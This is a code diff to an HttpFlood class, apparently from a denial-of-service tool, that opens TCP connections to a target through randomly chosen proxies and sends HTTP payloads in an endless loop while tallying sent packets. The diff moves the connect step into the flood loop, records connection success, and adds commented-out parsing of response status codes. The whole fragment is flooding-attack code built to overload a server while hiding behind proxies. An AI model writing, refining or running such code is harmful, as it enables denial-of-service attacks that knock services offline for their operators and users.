@@ -1,4 +1,6 @@
 import random
+import re
+import threading
 from contextlib import suppress
 from socket import socket
 from typing import Any, Tuple
@@ -22,17 +24,19 @@ class HttpFlood:
     def create_connection(self):
         self._proxy = self._ctx.proxy_manager.get_random_proxy()
         conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)
-        conn.connect(self._target)
 
         return conn
 
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as http_connect:
+            http_connect.connect(self._target)
+            self._ctx.Statistic.connect.status_success()
             while self.send(http_connect):
+                # http_response = repr(http_connect.recv(1024))
                 continue
 
-        self._ctx.Statistic.connect.status_failed()
-        self._ctx.sock_manager.close_socket()
+            self._ctx.Statistic.connect.status_failed()
+            self._ctx.sock_manager.close_socket()
 
     def send(self, sock: socket) -> bool:
         payload = self.payload().encode('utf-8')
@@ -45,6 +49,10 @@ class HttpFlood:
         else:
             self._ctx.Statistic.packets.status_sent(sent)
             self._proxy.report_success() if self._proxy is not None else 0
+
+            # http_response = repr(sock.recv(64, 0x40))
+            # status = int(re.search(r" (\d+) ", http_response)[1])
+            # self._ctx.Statistic.http_stats[status] += 1
             return True
 
         return False
